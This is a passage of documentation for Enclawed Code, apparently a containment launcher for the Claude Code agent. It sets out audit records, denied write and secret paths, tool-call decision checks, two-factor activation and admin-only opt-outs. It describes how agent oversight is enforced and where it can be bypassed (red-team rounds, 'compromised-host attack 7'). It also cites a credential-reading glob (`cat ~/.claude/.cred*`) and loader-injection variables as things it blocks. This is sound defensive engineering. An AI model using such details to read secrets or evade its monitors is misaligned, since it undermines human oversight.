- **claude.ai connectors** (account-level servers, tools `mcp__claude_ai_*`) are off: the generated settings set `disableClaudeAiConnectors: true` and pin `ENABLE_CLAUDEAI_MCP_SERVERS=false`, and `--strict-mcp-config` excludes them too. They are on only for the tools listed in `enclawedCode.claudeAiConnectors` (`["mcp__claude_ai_<connector>__<tool>" | "mcp__claude_ai_<connector>__*"]`) and, under a workflow, also in its `mcpTools`; every other connector tool is denied (`mcp-connector-not-allowed`). Because `--strict-mcp-config` also excludes connectors, admitting one means leaving it out, which Enclawed Code does only when no other MCP server is configured here (user, local, project, enabled plugins); otherwise the connectors stay off with a warning. `doctor` shows the state.

```
ecwctl mcp list [--json] [--mcp-config F]...   # records, and what a session here would start
ecwctl mcp pin NAME --containment FILE [--roles R] [--mcp-config F]...
ecwctl mcp pin REMOTE-NAME [--authorization-origin https://...]... [--client-id ID] [--scope S] [--mcp-config F]...
ecwctl mcp login REMOTE-NAME [--mcp-config F]...
ecwctl mcp import FILE | unpin NAME | show NAME
```

### Trust model

- The trust list is `<state>/claude-code/trust/signers.json`: Ed25519 public keys with key ids. It is in Enclawed Code's state directory, which no agent tool may write, and every change is an Enclawed Code command after two-factor authentication, recorded in the audit log (`claude-code.trust.add`, `claude-code.trust.remove`).
- The installation's own signer is created on the first `skills sign` or `mcp pin`, with the framework's Ed25519 primitive (`generateEd25519KeyPair`, `signManifest`, `verifyManifestSignature`). Its private key (`trust/local-signer.key.pem`, mode 0600) is a [secret the agent may not read](#secrets-the-agent-may-not-read).
- Other signers (a publisher, an organization's review pipeline) are added with `ecwctl trust add KEY-ID PUBLIC-KEY.pem [--label L]`; `trust list` and `trust remove` complete the set. Removing a signer makes every record it signed inadmissible at the next launch.
- A signature says only "this signer attested this exact content". The launcher re-runs every check itself; the signer's role is to vouch that the specification is the intended one, which no analysis can decide.
- Limits: the static analysis is the framework's (pattern packs for Python, POSIX shell and JavaScript/TypeScript); a capability flowing through an unanalyzed path (a variable command name, an interpreter given a computed path) is not seen by it, which is why reflective constructs and unreadable files fail the criterion and why a script still runs only through the ordinary gate. The criterion, like the paper's, is over operations, not payloads.

## Audit records

Each line of `audit.jsonl` is `{ ts, type, actor, level, payload, prevHash, recordHash }`. `ts` is milliseconds since the epoch; `actor` is `claude-code:<agent_id>` for a subagent, else `claude-code:<session_id>`, else `claude-code`. Every `claude-code.*` payload starts with `sessionId`, `agentId`, `agentType`, `permissionMode`, `cwd` and `origin`.

| Type | Written by | Payload (besides the common fields) |
|---|---|---|
| `claude-code.tool.pre` | PreToolUse | `toolUseId`, `tool`, `mcpServer`, `decision`, `codes`, `capability`, `reversible` (`true`, `false`, or `null` for denials), `projectDir`, `inputDigest` (SHA-256 of the canonical tool input), `targets` (file writes: the classification of each target, including the snapshot hash and the file's `mode`), `input` (summary) |
| `claude-code.hook.error` | PreToolUse that failed, or hook input that could not be parsed | `event`, `toolUseId`, `tool`, `decision: "deny"`, `error` (at most 2000 characters); for unparseable input `inputBytes` and `inputSha256` |
| `claude-code.tool.post` | PostToolUse | `toolUseId`, `tool`, `durationMs`, `inputDigest`, `inputChanged` (`{ decided, ran }` when another hook rewrote the input), `input`, `response` (summary), `written` (`{ path, sha256, bytes }` for file tools) |
| `claude-code.tool.failure` | PostToolUseFailure | `toolUseId`, `tool`, `isInterrupt`, `durationMs`, `error` (summary) |
| `claude-code.session.start` | SessionStart | `source`, `model`, `transcriptPath`, `launcher` (started through Enclawed Code), `launcherNonce` (the launch's handshake nonce), `policy` (`{ flavor, source, kind, note }`), `policyError`, `hardware` (status, serial and key of the device, `mode: "relay"` or `"per-call"`, `attested`, `allowed`, `reason`), `hardwareNotes`, `measurements` (SHA-256 of the hook, `src/*.mjs`, the framework, the policy file, the settings) |
| `claude-code.subagent.stop` | SubagentStop | `agentTranscriptPath` |
| `claude-code.launch`, `claude-code.launch.end` | the launcher | `nonce`, `cwd`, `managed`, `background`, `print`, `hardware`, `policy`; at the end `handshake`, `code`, `signal`, `halted` |
| `claude-code.launch.refused`, `claude-code.launch.no-handshake` | the launcher | why the launch was refused; a session whose hooks never reported in (with the control socket's refusals) |
| `claude-code.launch.unchecked-tool-call` | the launcher | a tool call the transcript shows that no verified hook decided; claude was stopped |
| `claude-code.launch.decision-mismatch` | the launcher | `toolUseId`, `code`, `reason`: a decision reported for a different call than the transcript's (round 3, N9), or made in a different context (`context-mismatch`, round 5: the working directory must be the transcript line's, or the session's; the permission mode a known one, bypass only when the session was started with it, and in `-p` the mode it was started in or a stricter one Claude Code fell back to, see `host-mode-downgraded`; the scratchpad `<tmp>/claude-<uid>/<project slug>/<session id>/scratchpad`) |
| `claude-code.launch.host-mode-downgraded` | the launcher | `toolUseId`, `launched`, `reported`: in `-p`, Claude Code runs in a stricter permission mode than it was launched in (it fell back by itself: Claude Code 2.1.326 starts a session launched in `auto` in `default` when auto mode is unavailable for the model, the plan or the settings). The session continues in the stricter mode; recorded once per mode. A mode more permissive than launched (or not comparable: `acceptEdits` under `auto`), or any mode in which a person answers asks when the session was launched in `bypassPermissions` (there Enclawed denies every ask; the lower mode would turn that denial into an ask), is a `decision-mismatch` and stops claude. The order is Claude Code's own: `plan` < `default` and `dontAsk` (`dontAsk` the stricter) < `acceptEdits` < `auto` < `bypassPermissions`, with `plan` counting as `bypassPermissions` when bypass is available (`MODE_ORDER`, `src/claude-prompt.mjs`) |
| `claude-code.launch.decision-violated` | the launcher | `toolUseId`, `decision`: a call that ran although Enclawed decided deny, or ask with no yes at Enclawed Code's own prompt (interactive) or no answer (round 4, N13; round 5, N13c) |
| `claude-code.launch.settings-dropped` | the launcher | `detail`: Claude Code reported it did not load the generated settings (round 4, F1) |
| `claude-code.launch.anchor-alarm`, `claude-code.launch.anchor-tamper` | the launcher | `code`, `message`: the device's anchor channel was BUSY or hijacked; `reason`: the log, anchor file or anchor history changed during the session (round 4, N14) |
| `claude-code.audit.gap` | the first append after the log was changed outside Enclawed Code | `reason` (`tail-does-not-match-head`, `log-deleted`, `log-emptied`, `head-anchor-deleted`, `head-anchor-cleared`), `expectedHead`, `foundTail` |
| `hardware.halt.credentials-erased` | the launcher, on a hardware halt | `nonce`, `halt`, `eraseEnabled`, `erased`, `remaining`, `reappeared`, `notes` (never a secret) |
| `claude-code.auth.attempt`, `claude-code.auth.set` | activation auth | `purpose`, `method`, `outcome` (`verified`, `failed`, `ticket`, `refused-headless`, `refused-backoff`), `failures` |
| `claude-code.policy.change`, `claude-code.policy.use` | policy commands | `file`, `command`, `before`, `after` (SHA-256 of the file) |
| `claude-code.hardware.recover` | `recover-root` | `statePath`, `outcome`, `code`, `serial` |
| `claude-code.hardware.anchor-takeover` | `recover-anchor` | `outcome` (`taken-over`, `aborted`, `refused`), `code` (`key-permissions`, `no-tty`, `serial-mismatch`), `serial`, `sid`, `operators`, `detail` |
| `claude-code.audit.accept`, `claude-code.audit.accept-attempt` | `audit accept` | `found` (`status`, `code`, `detail` of the mismatch overridden), `deviceBefore` (`counter`, `sess`, `opens`), `superseded` (the renamed anchor files), `serial`; attempts: `outcome` (`refused`, `aborted`), `code` |
| `claude-code.session.end` | SessionEnd | `reason` |
| `claude-code.config.change` | ConfigChange | `source`, `filePath` |
| `claude-code.hook.event` | any other event | `event` |
| `claude-code.history.restore` | `ecwctl history restore` | `id`, `hash`, `outcome` (`restored` or `refused`), `code`, `to`, `replacedSnapshot`, `replacedMode`, `mode` |
| `tool.hardware.halt` | the open core, when its hardware check refuses a call | `tool`, `toolCallId`, `sessionKey`, `code`, `reason`, `hardwareRoot` |

**What is not stored.** Commands, descriptions, patterns, URLs, queries, stdout, stderr and error text pass through the open core's DLP redaction and are truncated (commands 2000 characters, most others 200 to 1000, output 500). File content, edit strings, prompts and unrecognized tool inputs are recorded only as `{ sha256, bytes }`; unrecognized tool inputs also record their sorted key names.

The log and `audit.jsonl.head` are created with mode 0600 in a 0700 directory. Appends from Claude Code's parallel hook processes are serialized through an exclusive lock file, `audit.jsonl.lock`.

---

## Paths the agent may not write

Writes (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) resolving into any of these, through symlinks too, are **denied** (`protected-path`), not asked; a shell command that is not read-only and names one of them (literally, through `~`, `$HOME` or a relative path) is denied too: the Enclawed state directory (`~/.enclawed`: the gateway's config, Enclawed Code's policy, audit log and anchor, history, auth state), the history directory, every policy candidate, Enclawed Code's installation (code and framework build, and the framework's dependency directory), the Node binary that runs the hook, the session directory, and the hardware-root latch files. These are computed by the launcher and recorded in the session file. A hard link to any of these files is denied the same way ([file writes](#file-writes)).

## Secrets the agent may not read

(The installation's skill and MCP signer key, `<state>/claude-code/trust/local-signer.key.pem`, is one of them.)

The session directory (`session.json`, the decided-input records), the `auth/` directory (enrolled keys' public keys, counters and backoff state; the signed unlock ticket) and Claude Code's login file (`.credentials.json` where [the halt erase](#hardware-halt-and-claude-codes-login) looks for it, and under `~/.claude`) are **denied** (`secret-path`, red-team round 2, N5) to:

- `Read`, `NotebookRead`, `LS`, `Glob` and `LSP`, when the target is or is inside a secret (through symbolic links, and by inode for a hard link to a secret file); `Glob` also when its pattern matches one;
- `Grep`, also when it searches a directory that contains a secret (with no path it searches the working directory);
- every shell command that names a secret literally, through `~`, `$HOME` or a relative path, through a glob that matches it (`cat ~/.claude/.cred*`), or through a link; for `grep`, `rg` and similar searchers, also a directory that contains one.

A write that would copy a secret into the project needs a read first, which is denied. Commands that are not read-only and reach a secret indirectly (for example through a script) still ask a person first.

## Activation auth

Two-factor authentication is **mandatory**. Enclawed Code verifies the person at the keyboard before it starts a session (every launch), and before `recover-root`, `recover-anchor`, `audit accept`, every policy write (`policy init|edit|add-*|remove-*`, `policy use`; turning the credential erase off is recorded as disabling a protection) and `history restore`. There is no option, variable or policy key that turns it off, and no grace period.

The second factor is either a **FIDO2 security key** (YubiKey 5, YubiKey Bio, Google Titan, ...) or this computer's **device-bound passkey**: Windows Hello on a TPM, or Apple's or Android's secure hardware (a platform authenticator whose key is made in that hardware and never leaves it). Either one needs user verification (the key's PIN or fingerprint reader; for a passkey, its PIN, fingerprint or face) and user presence on every check. The check is the Enclawed framework's own (`enclawed/framework` `assertSecondFactor`): Enclawed Code keeps the prompts, the framework verifies. This computer keeps only the credential's public key and id. At enrollment the framework verifies the attestation against its pinned vendor roots (`tpm`, including TPM statements signed with SHA-1, `apple`, `android-key`, or a key's `packed` statement) and records the model (AAGUID). The signature counter must move forward on every use (a cloned key is refused); the one exception is a passkey whose enrollment proved a non-exportable TPM key, whose counter may stay put, and the framework re-verifies that proof on every use (a store that claims the exception without it is refused). Not accepted: a **synced passkey** (the authenticator marks it backup-eligible: its key is copied to a vendor cloud account; refused at enrollment and at every use), a passkey that does not verify the user, a platform credential without a hardware attestation, Touch ID or the macOS account password unlocking a key on this computer, `sudo`, a passphrase, an authenticator-app code (each keeps its secret or key on this computer).

A passkey is asked for through a one-time page the framework serves on `http://localhost:<port>` and opens in your browser (under WSL, the Windows browser); the terminal prints the page's address too, so you can open it yourself. The page answers once, only to the browser on this computer, and times out after two minutes. Under WSL the Windows browser reaches it through WSL's localhost forwarding (on by default, or `networkingMode=mirrored`); when a check from Windows shows the page cannot be reached, the command stops and says how to turn forwarding on.

**One factor per verification.** You are never asked for two factors in one verification:

- **With an Enclaweder attached:** only the 6-digit code from the authenticator app enrolled on the device, which the device checks (its signed verdict is the factor). No passkey page and no security-key touch. If the device is attached but cannot check a code (it is not CLEAN, another process owns it, it has no authenticator enrolled, or this framework build cannot ask it), the verification is refused and says so: `... With an Enclaweder attached its authenticator code is the only factor, so your passkey or security key is not asked instead; nothing was done`. Nothing falls back to the passkey. The device's own rules stay as they are where it asks for more (clearing a DIRTY latch: the code and a one-time recovery code, or the operator quorum).
- **Without an Enclaweder:** only this computer's passkey (or a security key when no passkey is enrolled), verified on this host.

Prompt with an Enclaweder: `Authenticator code (checked by the Enclaweder): `. When the device's clock and this computer's disagree (firmware 0.3.4, command set 0.6, `ERR_TIME`): `the Enclaweder's clock and this computer's disagree: check this computer's time, or cancel this prompt (Ctrl-C), unplug and replug the Enclaweder, then try again with a new code`.

**How often you are asked.**

| When | Without an Enclaweder | With an Enclaweder attached | How often |
|---|---|---|---|
| Starting a session at a terminal | confirm the passkey on the page that opens (PIN, fingerprint or face), or touch the security key and enter its PIN | type the code from the authenticator app; the device checks it (3 tries) | every launch |
| Sensitive commands (`audit accept`, policy writes, `history restore`, `files accept`, `review enable`, `auth test`) | the passkey or the security key | the device's code | every time; a ticket or unlock never covers them |
| `recover-root`, `recover-anchor` | (they need the device) | the device's own rule (the code and a one-time recovery code, or the operator quorum) | every time |
| Headless launches (`-p`, scripts, CI) | run `auth unlock` once at a terminal: the passkey or the key signs a ticket | run `auth unlock` once at a terminal: one code; the device keeps a **device unlock** (counted by the device) and Enclawed Code signs the ticket it is bound to with a key of its own (not a factor) | 1 launch by default, up to 65535 (`--uses`); 10 minutes by default (`auth.unlockMinutes`), at most 2160 (36 hours); ends at a reboot. With a device, more than 1 launch or 10 minutes must name ONE job (`--job NAME`, see below) |
| ... with the hardware root required | | after installing or upgrading ecwcode: `ecwctl measurement approve` (one code); after a policy change: the change asks for a code, or `ecwctl policy approve` | once per installed version and once per policy |
| Wrong PIN or code | after 5 failures in a row, each further try waits 30 s, doubling up to 1 hour | | |

When the ticket or the device unlock runs out, a headless launch is refused with the command to run, and nothing else is affected.

```
ecwctl auth enroll [--label NAME]                      register this computer's device-bound passkey (a page opens in your browser; --passkey: the same)
ecwctl auth enroll --security-key [--label NAME] [--alg es256|eddsa]   register a FIDO2 security key instead (touch + PIN; --fido2: the same)
ecwctl auth status [--json]
ecwctl auth test                                       one full check, audited
ecwctl auth unlock [--minutes N] [--uses N] [--job NAME]   a ticket for headless launches (beyond 1 launch or 10 min: one job)
ecwctl policy approve | measurement approve   approve the policy in effect / this Enclawed Code's code with a code the Enclaweder checks
ecwctl auth lock                                       revoke the ticket now
ecwctl auth remove ID                                  unenroll a key or passkey (never the last one)
```

**Setup.** Install libfido2's tools (Debian/Ubuntu `sudo apt install fido2-tools`, macOS `brew install libfido2`), set a PIN on the key if it has none (`fido2-token -S <device>`, the device from `fido2-token -L`), then `ecwctl auth enroll --security-key --label primary`. Enroll a second key as a backup: plug in both and run `ecwctl auth enroll --security-key --label backup` (a touch of the enrolled key comes first). On Windows, run elevated so the key is reached directly: without elevation Windows routes requests through its own WebAuthn service, which libfido2 cannot use (Windows Hello itself is enrolled as a passkey, below). The full guide, including which keys to buy, is in the Enclawed repository: `docs/security/two-factor.md`.

**The default is this computer's passkey.** `ecwctl auth enroll` with no method enrolls this computer's device-bound passkey at once; a FIDO2 security key is the explicit alternative (`--security-key`, or `--fido2`, or `--method fido2`). With no terminal it fails with `enrolling a passkey needs a person at the terminal: ecwctl auth enroll (this computer's device-bound passkey: Windows Hello, Apple or Android), or ecwctl auth enroll --security-key (a FIDO2 security key with a PIN)`. Enroll a backup too: this account's passkey on another device you sign in from, or a security key. Without an Enclaweder, verification uses the enrolled passkey; a security key only when no passkey is enrolled.

**Setup, device-bound passkey.** `ecwctl auth enroll --label laptop` (`--passkey` and `--method passkey` are the same). On WSL the page opens in the Windows browser (`wslview`, else `cmd.exe /c start` from `/mnt/c`), so Windows Hello answers it; when no opener works, the URL is printed to open by hand. A page opens in your browser; create the passkey on this device (on Windows, choose Windows Hello, not a phone or a password manager) and confirm with your PIN, fingerprint or face. The framework accepts it only when its attestation chains to the vendor's pinned root and the passkey is not synced; otherwise nothing is enrolled and the refusal is audited with the reason (`backup-eligible`, `no-user-verification`, `attestation-...`). With a factor already enrolled, that factor is asked first. A passkey lives and dies with this device (a reinstall of Windows or a cleared TPM loses it), so keep a FIDO2 security key enrolled as a backup. `auth status` lists each factor as a security key or a passkey with its attestation format; a TPM passkey whose counter does not move shows `TPM key, non-exportable`.

**With an Enclaweder: a device-verified factor on every launch** (compromised-host attack 7). The FIDO2 check and the unlock ticket are verified on this computer, against a factor store on this computer, so a process running as you that rewrites that store can enroll its own key and sign its own ticket. With an Enclaweder held, every launch therefore also needs a code from your authenticator app that the **device** verifies (the TOTP secret was made on the device and never leaves it). Enclawed Code sends the code with a nonce it chose; the device answers with a verdict signed by its certified key over that nonce, and only a passing verdict for the expected purpose from the bound device counts:

- interactive launch: you type the code after the security-key check (`Authenticator code (checked by the Enclaweder)`, three tries); the nonce is fresh for this launch;
- measured launch and approved policy: with the hardware root required, the launcher measures Enclawed Code's hook, its own code and the framework bundle before claude starts, and refuses the launch unless the Enclaweder signed an approval of that measurement (`ecwctl measurement approve`, after every install or upgrade) and, when a policy file you can write changed the effective policy, of that policy (`ecwctl policy approve`; every policy command asks for it). A root-owned managed policy needs no approval. Approvals are kept in `approvals.json` in Enclawed Code's state directory: editing it gains nothing (each is the device's signed verdict over the digest), removing it only refuses launches.
- per-call device commitments: while a session holds the Enclaweder, the device signs every decision (the call, its input digest, the decision, the approved policy, the measured code and the previous call's signature); the commitment is in the call's `claude-code.tool.pre` record. The launcher stops claude when a decision is reported that the device did not sign, and `ecwctl audit verify` fails when a call of such a session is unsigned, out of order or missing, or decided against the policy recorded at launch, and when the device's anchor cannot be read fresh.
- job-bound unlock: `ecwctl auth unlock --uses N --minutes M --job NAME [--project DIR] [--kind headless:print|headless]` delegates up to N headless launches of ONE job: this Enclawed Code's measured code, the effective policy, the project DIR (default the current directory) and the launch kind. What it delegates: anyone who can start that exact job on this machine (same code, same policy, same project, same kind) can run it with any prompt, under the policy, until the uses or minutes run out; any other launch is refused by the device with uses left. Without `--job`, an unlock covers one launch within 10 minutes.
- headless launch: `auth unlock` at a terminal asks for the code once and writes a **device unlock** next to the ticket (`device-unlock.json` in Enclawed Code's state directory). Its nonce is the hash of its own content (device, boot, user, minutes, uses), so the device's signature covers it: an edited, forged or re-purposed one does not verify. Its time starts at the step of the code the device accepted (your authenticator's clock). Headless launches then run without you until it expires (`--minutes`, default 60, at most 2160, which is 36 hours) or its launches (`--uses`, at most 65535) are used up; `auth lock` removes it. Every check is recorded as `claude-code.auth.device-factor`.
- Limits: within its validity, any process of your user can start a headless session with it (that is the delegation). The **device** keeps the unlock, its uses and its time, and signs a receipt for each launch over a nonce Enclawed Code chose: editing or copying `device-unlock.json` gains nothing, and when its uses or time run out the device refuses further launches even on a compromised host.
- This needs the framework's device-verified TOTP calls in its public entry (`hardwareRootTotpDevice`, `deviceTotpEnrolled`, a TOTP_VERIFY over a caller-chosen nonce that returns the signed verdict, and its offline check) and Enclaweder firmware with TOTP_VERIFY. Until the framework build has them, a launch with an Enclaweder says `activation is not device-verified` and attack 7 stays open; nothing is checked on this host in the device's place. A device without an enrolled authenticator refuses every launch.

**Headless runs** (`-p`, CI, output not a terminal): a launch passes only with an unlock ticket from `auth unlock`. The security key or passkey signs the ticket itself (the assertion's challenge is the hash of the ticket: user, host, boot, expiry, uses), so nothing on this computer can create, extend or rebind one. A ticket admits launches only (never the sensitive commands above), lasts `enclawedCode.auth.unlockMinutes` (default 10, at most 2160) or `--minutes`, admits one launch unless `--uses N` (up to 65535), dies with a reboot and is never renewed. `--passphrase-fd` is no longer accepted.

After 5 consecutive failures each further attempt waits 30 s, doubling up to an hour (persisted). Every attempt, success or failure (including a cancelled prompt, a lock that cannot be taken and a framework that cannot load), is recorded as `claude-code.auth.attempt` (purpose, outcome, the key's local id and model; never a PIN or a challenge); enrollments, removals and tickets as `claude-code.auth.enroll`, `claude-code.auth.remove`, `claude-code.auth.ticket`.

**Upgrading.** An install set up with an earlier method (the unattested `windows-hello` or `macos` method of an earlier Enclawed Code, which unlocked a key kept on this computer, or `sudo`, a passphrase) is refused at the next launch, with the steps above. Windows Hello on a TPM is accepted again, as an attested device-bound passkey: enroll it with `auth enroll --passkey`.

What it does and does not do: it gates Enclawed Code and its sensitive commands. It does not stop someone from running plain `claude` with valid credentials (managed settings and the credential erase on a hardware halt address that). In a software-only install a process running as you that can rewrite Enclawed Code's protected state directory could replace the enrolled public key; the enrollment is in the hash-chained audit log.

## Environment variables

### Read by Enclawed Code

All of these are read by the **launcher** (and Enclawed Code's own commands) from the shell you start it in. The hook reads none of them: it gets what the launcher resolved from the session file. In managed mode it uses the OS account's home directory and its command-line options.

| Variable | Read by | Default | Effect |
|---|---|---|---|
| `ECWCODE_CLAUDE_PATH` | launcher, doctor | search `PATH` | The claude executable to run. Must exist, be executable and not be Enclawed Code, otherwise "cannot find your Claude Code installation" (exit 127). |
| `PATH` | launcher | | Searched for `claude` when `ECWCODE_CLAUDE_PATH` is not set. |
| `ENCLAWED_STATE_DIR` | launcher, commands | `~/.enclawed` (or the legacy `~/.clawdbot` when only that exists) | Enclawed state directory, resolved exactly as the open core does. Enclawed Code keeps its own files in `<state>/claude-code/`; the history defaults to `<state>/history`. A leading `~` is expanded. |
| `ENCLAWED_HISTORY_DIR` | history, hook | `<state>/history` | The history store directory. |
| `ENCLAWED_CONFIG_PATH` | launcher | see [policy](#where-it-is-read-from) | A policy file that precedes Enclawed Code's own (step 2). Ignored when a managed policy exists. |
| `ENCLAWED_HOME` | launcher, commands | your home directory | The home used for `~/.enclawed` (state, Enclawed Code's own files, history and config), as in the open core. |
| `ENCLAWED_FLAVOR` | policy | the managed policy's flavor (open without one) | Can only raise the flavor: `enclaved` selects deny-by-default over an open base; `open` never lowers an enclaved managed policy; any other value is read as `enclaved` (see [policy](#where-it-is-read-from)). |
| `HOME` | everything | OS home | Default location of `~/.enclawed` and `~/.claude`. |
| `CLAUDE_CONFIG_DIR`, `CLAUDE_SECURESTORAGE_CONFIG_DIR` | launcher | `~/.claude` | Claude Code's user settings (scanned for `disableAllHooks`, other PreToolUse hooks and sensitive `env`) and where its login is erased on a hardware halt. |
| `CLAUDE_PROJECT_DIR` | hook (managed mode only) | the hook input's `cwd` | The project root in managed mode (Claude Code sets it; it is the one variable the hook command passes through `env -i`). In launcher mode the project root is the directory Enclawed Code was started in. |
| `ENCLAWEDER_ROOT` | launcher (then the open core) | unset (absence of a device allowed) | Exactly `required` (lowercase): no device means every call is denied, and `--bg` is refused. Any other value (`1`, `true`, `Required`, ` required`, `optional`, `off`, ...) refuses the start (exit 2), so the launcher, the hook and the framework never read one value differently. `optional` (start a fresh software-only session although a device-accredited session was left open, for retiring a device) is an administrator's decision: `"hardwareRoot": "optional"` in the [opt-out file](#admin-only-opt-outs). |
| `ENCLAWEDER_BROKER` | open core | `$XDG_RUNTIME_DIR/enclawed-<uid>/enclaweder.sock` (else under the OS temp dir) | `off`, `0` or `false`: no sharing of the device between processes; the launcher holds nothing and each hook binds the device itself. Any other value is the owner's socket path. |
| `ENCLAWEDER_HIDRAW` | open core | auto-detect | Pin one Enclaweder device path. |
| `ENCLAWEDER_STATE`, `ENCLAWEDER_STATE_DIR` | open core | `$HOME/.enclawed-hw-root.state` | Where the hardware root keeps its state (including a latched DIRTY). |
| `XDG_RUNTIME_DIR` | open core | OS temp dir | Base of the default owner socket path. |

**Only these framework variables are passed on.** The launcher gives the framework (in its own process and in the hook's session environment) only `ENCLAWED_STATE_DIR`, `ENCLAWED_HOME`, `ENCLAWED_HISTORY_DIR`, `ENCLAWED_FIPS_REQUIRED`, `ENCLAWEDER_HIDRAW`, `ENCLAWEDER_STATE`, `ENCLAWEDER_STATE_DIR`, `ENCLAWEDER_BROKER`, `ENCLAWEDER_DEVICE` and the resolved `ENCLAWED_FLAVOR` and `ENCLAWEDER_ROOT`. Every other `ENCLAWED_*` or `ENCLAWEDER_*` variable in your shell is dropped and named in the `claude-code.launch.opt-outs` audit record (names only), with a warning for the ones that move or send evidence: `ENCLAWEDER_FORENSIC_WEBHOOK`, `ENCLAWEDER_FORENSIC_LOG`, `ENCLAWEDER_AUDIT_PATH`, `ENCLAWEDER_QUEUE_LOG`, `ENCLAWED_AUDIT_PATH`, `ENCLAWED_CLASSIFICATION_SCHEME`, `ENCLAWED_NIX_MODE`. A forensic webhook comes only from the administrator (`forensicWebhook` in the [opt-out file](#admin-only-opt-outs)).

### Admin-only opt-outs

Enclawed Code assumes the account it runs under may be compromised, and anything that account can set (its shell, its files) is a knob an attacker can turn. So the few decisions that loosen a default are read only from an opt-out file an administrator writes, and the internal parameters are not settings at all.

```
/etc/enclawed/enclawed-code-opt-outs.json          (or enclawed-code-opt-outs.json in Claude Code's managed-settings directory, /etc/claude-code on Linux)
{
  "v": 2,
  "projectHooks":    [{ "repo": "/home/alice/src/app", "digest": "<64 hex>", "note": "reviewed 2026-11-22" }],
  "projectCommands": [{ "repo": "/home/alice/src/app", "digest": "<64 hex>" }],
  "reducedContainment": true,
  "hardwareRoot": "optional",
  "forensicWebhook": "https://forensics.example.com/enclaweder",
  "loaderEnv": ["LD_PRELOAD"]
}
```

| Key | Grants |
|---|---|
| `projectHooks` | One repository hook, in one repository (see step 8 of [launching Claude Code](#launching-claude-code)). The refusal prints the entry. A changed hook, or a changed script it runs, needs a new entry. |
| `projectCommands` | One repository command (a command-valued setting or an `.mcp.json` server that would start), in one repository, by digest as above. |
| `reducedContainment` | Start a hardware-root session on Linux although neither the systemd scope nor the subreaper wrapper is available (step 15). macOS uses process tracking and does not need it. |
| `hooks` | One hook from the user's settings, a plugin, a user skill or subagent, or a `--settings` value, by digest (`{ "digest": "<64 hex>" }`, printed by the refusal). It covers the hook entry and every absolute file it names (`~`, `$HOME`, `$CLAUDE_PLUGIN_ROOT` expanded); such a hook runs in every session. |
| `loaderEnv` | Loader-injection variables (`LD_PRELOAD`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`) that may reach claude from the user's shell; without it they are removed from claude's environment (warned and audited). |
| `hardwareRoot` | Exactly `"optional"`: run software-only after a session a now-absent Enclaweder accredited (retiring a device). |
| `forensicWebhook` | An `https` URL (no credentials in it) the framework POSTs the forensic snapshot to on a halt. Never from your shell. |

The file must be owned by root with a mode no wider than 0644, must not be a symlink, and every directory above it must be owned by root and not writable by group or other (`sudo install -d -m 0755 /etc/enclawed`, then `sudo install -m 0644 enclawed-code-opt-outs.json /etc/enclawed/`). Every key is validated: a file that fails the ownership check, is not valid JSON, has an unknown key, a wrong type or another version grants nothing and is named in a warning. On Linux the files are ignored inside a user namespace other than the initial one, where a bind mount can make a user's file look root-owned. Windows has no such file yet: nothing is grantable there. Each start records what was granted and used in a `claude-code.launch.opt-outs` audit record. The earlier names `codenclawed-opt-outs.json` and `enclawde-opt-outs.json` are still read, under the same rules.

**Fixed behavior (no longer settings).** Earlier builds read these from the environment; they are gone, and a shell that still sets one gets a warning on every start (recorded in the audit log): `CODENCLAWED_SCOPE` and `CODENCLAWED_SUBREAPER` (containment always on), `CODENCLAWED_APPROVAL_TTY` (approvals at `/dev/tty`), `CODENCLAWED_ALLOW_PROJECT_OVERLAP` (always refused), `CODENCLAWED_ALLOW_PROJECT_HOOKS` and `CODENCLAWED_ALLOW_PROJECT_COMMANDS` (now per-repository grants above), `CODENCLAWED_ERASE_RECHECKS` (5), `CODENCLAWED_ERASE_WATCH_S` (60 s), `CODENCLAWED_HANDSHAKE_TIMEOUT_S` (30 s), `CODENCLAWED_PREVALIDATE` (always on) and `CODENCLAWED_TEST_OPT_OUT_DIR`. A version 1 opt-out file (`{ "v": 1, "optOuts": { ... } }`) grants nothing. The test suite sets its own stand-ins through a function call in its own entry point (`src/authority.mjs`), which no environment variable or file of an install reaches. Any other `CODENCLAWED_*` or `ENCLAWDE_*` variable (the names of earlier builds) is ignored with a warning: the variables are `ECWCODE_*` now.

### Set by Enclawed Code for claude and its hooks

claude gets the environment of the shell `ecwcode` was started from, with only these differences (checked by `test/interactive-parity.test.mjs`, which compares a stand-in claude's whole environment with the shell's):

| Variable | Value |
|---|---|
| `ECWCODE_SESSION` | `1`. Recorded in `session.start` as `launcher: true`. |
| `ECWCODE_VERSION` | Enclawed Code's version. |
| `ECWCODE_SESSION_MARK` | A random marker of this session, so a halt finds every process the session started. |
| `ENCLAWED_FLAVOR` | The flavor in effect (`open` or `enclaved`). |
| `ENABLE_CLAUDEAI_MCP_SERVERS` | `false` unless your policy admits claude.ai connectors ([MCP admission](#mcp-admission)). |
| `PATH` | Your `PATH` with one empty directory of the session appended (nothing is found there, so no command resolves differently); it tells the session's shell snapshot apart. |
| `SHLVL` | Set to `1` only when it is missing or outside 1 to 998. |
| `LD_PRELOAD`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES` | Removed unless an administrator grants them (`loaderEnv`, above). |

With an Enclaweder bound and Claude Code's login sealed, also: `CLAUDE_CONFIG_DIR` (the session's private configuration directory, sealed under the device between sessions), `CLAUDE_SECURESTORAGE_CONFIG_DIR` (an empty private directory: no login on disk), `ANTHROPIC_UNIX_SOCKET` and `CLAUDE_CODE_OAUTH_TOKEN=ssh-placeholder` (model requests go through Enclawed Code's relay, which adds the real token), `NODE_EXTRA_CA_CERTS` (your own CA file plus the relay's session CA), the tool-login redirections `GH_CONFIG_DIR`, `NPM_CONFIG_USERCONFIG`, `AWS_SHARED_CREDENTIALS_FILE`, `AWS_CONFIG_FILE`, `CLOUDSDK_CONFIG`, `AZURE_CONFIG_DIR`, `DOCKER_CONFIG`, `KUBECONFIG` and `HF_TOKEN_PATH` (into the session's sealed store), and these are removed: `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_BASE_URL`, `ANTHROPIC_CUSTOM_HEADERS`, the `CLAUDE_CODE_*` token and provider switches (`CLAUDE_CODE_USE_BEDROCK`, `_VERTEX`, `_FOUNDRY`, ...), `GIT_CONFIG_GLOBAL`, `DBUS_SESSION_BUS_ADDRESS` and `GNOME_KEYRING_CONTROL`.

### Build only

| Variable | Effect |
|---|---|
| `ENCLAWED_OSS_DIR` | The enclawed-oss checkout `npm run build:framework` builds from (see below). |

---

## Files and directories

